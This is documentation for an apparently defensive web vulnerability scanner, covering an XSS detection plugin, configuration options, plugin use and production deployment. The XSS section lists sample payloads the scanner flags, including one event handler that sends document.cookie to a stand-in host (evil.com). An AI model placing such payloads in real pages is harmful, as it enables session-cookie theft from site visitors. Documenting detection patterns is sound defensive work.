# Advanced Features Guide

This guide covers the advanced features added in the latest iteration of the web vulnerability scanner.

## Table of Contents

1. [XSS Scanner Plugin](#xss-scanner-plugin)
2. [Configuration Management](#configuration-management)
3. [Using Multiple Plugins](#using-multiple-plugins)
4. [Advanced Scanning Scenarios](#advanced-scanning-scenarios)
5. [Production Deployment](#production-deployment)

---

## XSS Scanner Plugin

The XSS (Cross-Site Scripting) scanner detects common XSS vulnerabilities and injection points.

### What It Detects

**Critical Severity**:
- `eval()` function usage
- `setTimeout()/setInterval()` with `eval()`

**High Severity**:
- Inline script tags
- Event handlers with suspicious code
- JavaScript protocol handlers (e.g., `href="javascript:"`)
- `innerHTML` assignments
- `new Function()` constructor

**Medium Severity**:
- `innerText` assignments
- Unescaped template variables (`{{ }}`, `${}`)
- `data:` URI handlers
- `document.write()` usage
- Form submissions to external domains

### Example Usage

```python
from src.scanner.plugins.xss_scanner import XSSScanner

scanner = XSSScanner()

# Scan HTML content
html = '''
<html>
    <body>
        <button onclick="alert('XSS')">Click me</button>
        <script>eval(userInput);</script>
    </body>
</html>
'''

result = scanner.scan(html)

for finding in result['vulnerabilities']:
    print(f"{finding['issue']}: {finding['severity']}")
    # Output:
    # suspicious_event_handler: high
    # inline_script_tag: high
    # eval_usage: critical
```

### XSS Patterns Detected

#### 1. Script Tags
```html
<script>alert('XSS')</script>
```

#### 2. Event Handlers
```html
<img onerror="alert(document.cookie)">
<button onclick="fetch('http://evil.com?data=' + document.cookie)">
```

#### 3. JavaScript Protocol
```html
<a href="javascript:alert('XSS')">Click</a>
<img src="javascript:void(0)">
```

#### 4. Dangerous Functions
```javascript
eval(userInput);
document.getElementById('div').innerHTML = userInput;
new Function(userInput)();
```

#### 5. Unescaped Output
```html
{{ unsafeVariable }}
${ unsafeVariable }
```

### Scan Results

```json
{
  "vulnerabilities": [
    {
      "url": "inline",
      "issue": "inline_script_tag",
      "severity": "high",
      "context": "<script>alert('XSS')</script>",
      "line": 5
    },
    {
      "url": "inline",
      "issue": "suspicious_event_handler",
      "severity": "high",
      "handler": "onclick=\"alert('XSS')\"",
      "value": "alert('XSS')"
    },
    {
      "url": "inline",
      "issue": "eval_usage",
      "severity": "critical",
      "description": "Use of eval() function detected - major XSS risk"
    }
  ]
}
```

---

## Configuration Management

The new configuration module (`src/config.py`) provides centralized management of scanner behavior.

### Configuration Hierarchy

```
Config (base)
├── DevelopmentConfig
├── ProductionConfig
└── TestingConfig
```

### Environment-Based Configuration

Configuration is automatically selected based on `FLASK_ENV`:

```bash
# Development (default)
FLASK_ENV=development python -m flask --app src.api.app:app run

# Production
FLASK_ENV=production python -m flask --app src.api.app:app run

# Testing
FLASK_ENV=testing pytest tests/ -v
```

### Configuration Options

#### Rate Limiting
```python
from src.config import get_config

config = get_config()

print(config.RATE_LIMIT_ENABLED)      # bool
print(config.RATE_LIMIT_REQUESTS)     # int (requests per window)
print(config.RATE_LIMIT_WINDOW)       # int (seconds)
```

**Defaults**:
- Development: Disabled
- Production: 50 requests/60s
- Testing: Disabled

#### Scanner Settings
```python
config.SCANNER_TIMEOUT          # Request timeout in seconds
config.SCANNER_MAX_RETRIES      # Number of retries
config.SCANNER_FOLLOW_REDIRECTS # Follow HTTP redirects
```

#### Security Headers
```python
config.SECURITY_HEADERS_ENABLED      # Enable/disable headers
config.CUSTOM_SECURITY_HEADERS       # Dict of headers to apply
```

Example:
```python
{
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "no-referrer",
    "Content-Security-Policy": "default-src 'self'; ..."
}
```

#### Plugin Configuration
```python
config.ENABLED_PLUGINS  # List of plugin names to load
```

Example:
```python
["MediaLinkScanner", "XSSScanner"]
```

#### Security Configuration
```python
config.SUSPICIOUS_DOMAINS  # Set of domains to flag
config.XSS_CHECK_PATTERNS  # Enable/disable XSS pattern checks
```

### Loading Custom Configuration

#### From Environment Variables
```python
from src.config import Config

config = Config.from_env()

# Environment variables (override defaults):
# RATE_LIMIT_REQUESTS=100
# RATE_LIMIT_WINDOW=60
# SCANNER_TIMEOUT=45
# API_PORT=8080
```

#### From JSON File
```python
from src.config import Config

config = Config.from_file('config.json')

# config.json:
# {
#   "RATE_LIMIT_REQUESTS": 200,
#   "RATE_LIMIT_WINDOW": 120,
#   "SCANNER_TIMEOUT": 60
# }
```

#### Using Global Configuration
```python
from src.config import get_config, set_config, reload_config

# Get current configuration
config = get_config()

# Set a custom configuration
from src.config import ProductionConfig
set_config(ProductionConfig())

# Reload from environment
reload_config()
```

---

## Using Multiple Plugins

The scanner engine supports running multiple plugins in sequence.

### Example: Combining Multiple Scanners

```python
from src.scanner.engine import Engine
from src.scanner.plugins.media_link_scanner import MediaLinkScanner
from src.scanner.plugins.xss_scanner import XSSScanner

# Create engine
engine = Engine()

# Load multiple plugins
plugins = [
    MediaLinkScanner(),
    XSSScanner(),
]
engine.load_plugins(plugins)

# Run scan - all plugins execute
results = engine.run_scan("https://example.com")

# Results include findings from all plugins
print(results)
# {
#   "vulnerabilities": [
#     {"url": "...", "issue": "insecure_protocol", "severity": "medium"},
#     {"url": "inline", "issue": "eval_usage", "severity": "critical"},
#     ...
#   ]
# }
```

### Plugin Auto-Discovery

Plugins are automatically registered when their module is imported:

```python
from src.scanner.engine import Engine

# Auto-load plugins by default
engine = Engine()
engine.load_plugins()  # Loads ExamplePlugin automatically
```

### Creating a Custom Plugin

```python
# src/scanner/plugins/csrf_scanner.py

class CSRFScanner:
    """Detect CSRF vulnerability patterns."""
    
    def scan(self, target=None):
        """Scan for CSRF vulnerabilities.
        
        Args:
            target: URL or HTML content
            
        Returns:
            {"vulnerabilities": [...]}
        """
        findings = []
        
        # Your CSRF detection logic
        if "csrf" not in (target or "").lower():
            return {"vulnerabilities": []}
        
        findings.append({
            "url": target or "inline",
            "issue": "missing_csrf_protection",
            "severity": "high",
            "description": "No CSRF token detected in forms"
        })
        
        return {"vulnerabilities": findings}
```

---

## Advanced Scanning Scenarios

### Scenario 1: Comprehensive Website Audit

```python
from src.scanner.engine import Engine
from src.scanner.plugins.media_link_scanner import MediaLinkScanner
from src.scanner.plugins.xss_scanner import XSSScanner

engine = Engine()
engine.load_plugins([MediaLinkScanner(), XSSScanner()])

# Scan multiple URLs
urls = [
    "https://example.com",
    "https://example.com/products",
    "https://example.com/about",
]

all_findings = {"vulnerabilities": []}

for url in urls:
    results = engine.run_scan(url)
    all_findings["vulnerabilities"].extend(results["vulnerabilities"])

# Generate report
print(f"Scanned {len(urls)} pages")
print(f"Found {len(all_findings['vulnerabilities'])} issues")

# Group by severity
by_severity = {}
for finding in all_findings["vulnerabilities"]:
    severity = finding.get("severity", "unknown")
    if severity not in by_severity:
        by_severity[severity] = []
    by_severity[severity].append(finding)

for severity in ["critical", "high", "medium", "low"]:
    if severity in by_severity:
        print(f"  {severity.upper()}: {len(by_severity[severity])}")
```

### Scenario 2: Custom Configuration for Strict Scanning

```python
from src.config import Config, get_config, set_config
from src.scanner.engine import Engine
from src.scanner.plugins.xss_scanner import XSSScanner

# Create strict configuration
class StrictConfig(Config):
    SCANNER_TIMEOUT = 10
    RATE_LIMIT_ENABLED = False
    XSS_CHECK_PATTERNS = True

set_config(StrictConfig())

# Now scan with strict settings
engine = Engine()
engine.load_plugins([XSSScanner()])
results = engine.run_scan("https://example.com")
```

### Scenario 3: Filtering Results

```python
from src.scanner.engine import Engine
from src.scanner.plugins.media_link_scanner import MediaLinkScanner
from src.scanner.plugins.xss_scanner import XSSScanner

engine = Engine()
engine.load_plugins([MediaLinkScanner(), XSSScanner()])

results = engine.run_scan("https://example.com")

# Filter by severity
critical_issues = [
    v for v in results["vulnerabilities"]
    if v.get("severity") == "critical"
]

# Filter by issue type
xss_issues = [
    v for v in results["vulnerabilities"]
    if "xss" in v.get("issue", "").lower()
]

print(f"Critical issues: {len(critical_issues)}")
print(f"XSS issues: {len(xss_issues)}")
```

---

## Production Deployment

### Production Configuration

```python
# src/config.py auto-selects ProductionConfig when FLASK_ENV=production

ProductionConfig features:
- Debug mode DISABLED
- Rate limiting ENABLED (stricter: 50 req/60s)
- Blocklist persistence support
- Shorter timeouts (30s)
- INFO level logging
```

### Recommended Deployment Steps

1. **Set environment variables**:
```bash
set FLASK_ENV=production
set API_PORT=5000
set RATE_LIMIT_REQUESTS=50
set RATE_LIMIT_WINDOW=60
```

2. **Run with production server** (not Flask dev server):
```bash
# Using Gunicorn
gunicorn -w 4 -b 0.0.0.0:5000 src.api.app:app

# Or using Waitress
waitress-serve --port=5000 src.api.app:app
```

3. **Behind a reverse proxy** (e.g., Nginx):
```nginx
server {
    listen 80;
    server_name api.example.com;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

4. **Enable monitoring and logging**:
```python
import logging
from src.config import get_config

config = get_config()
logging.basicConfig(
    level=config.LOG_LEVEL,
    format=config.LOG_FORMAT
)
logger = logging.getLogger(__name__)
```

### Performance Tuning

```python
from src.config import ProductionConfig

config = ProductionConfig()

# For high-traffic scenarios
config.RATE_LIMIT_REQUESTS = 1000  # Adjust per your needs
config.SCANNER_TIMEOUT = 60  # Longer timeout for large pages
```

### Security Hardening

1. **Use HTTPS in production**:
```bash
set API_SCHEME=https
```

2. **Add authentication**:
```python
# Use Flask-HTTPAuth or similar
from flask_httpauth import HTTPBasicAuth

auth = HTTPBasicAuth()

@app.route('/scan', methods=['POST'])
@auth.login_required
def start_scan():
    # Protected endpoint
    pass
```

3. **Enable CORS carefully**:
```python
from flask_cors import CORS

CORS(app, resources={"/api/*": {"origins": ["trusted-domain.com"]}})
```

4. **Implement API rate limiting at application level**:
```python
from src.config import get_config

config = get_config()
# Already configured in middleware!
```

---

## Troubleshooting

### Configuration Not Loading

```bash
# Check current configuration
set FLASK_ENV=production  # or development, testing
python -c "from src.config import get_config; print(get_config().to_json())"
```

### Rate Limiting Not Working

```python
from src.config import get_config

config = get_config()
print(config.RATE_LIMIT_ENABLED)    # Should be True
print(config.RATE_LIMIT_REQUESTS)   # Should be > 0
```

### XSS Scanner Not Finding Issues

```python
from src.scanner.plugins.xss_scanner import XSSScanner

scanner = XSSScanner()
result = scanner.scan("<script>alert(1)</script>")

print(result)  # Should have findings
```

---

## Next Steps

1. **Add more plugins** for CSRF, SQL injection, authentication flaws
2. **Implement Redis** for persistent rate limiting
3. **Build async scanning** for parallel processing
4. **Create web dashboard** for visualization
5. **Add webhook notifications** for scan completion
6. **Integrate threat intelligence** feeds

---

*For more information, see the main [README.md](README.md) and [docs/architecture.md](docs/architecture.md)*
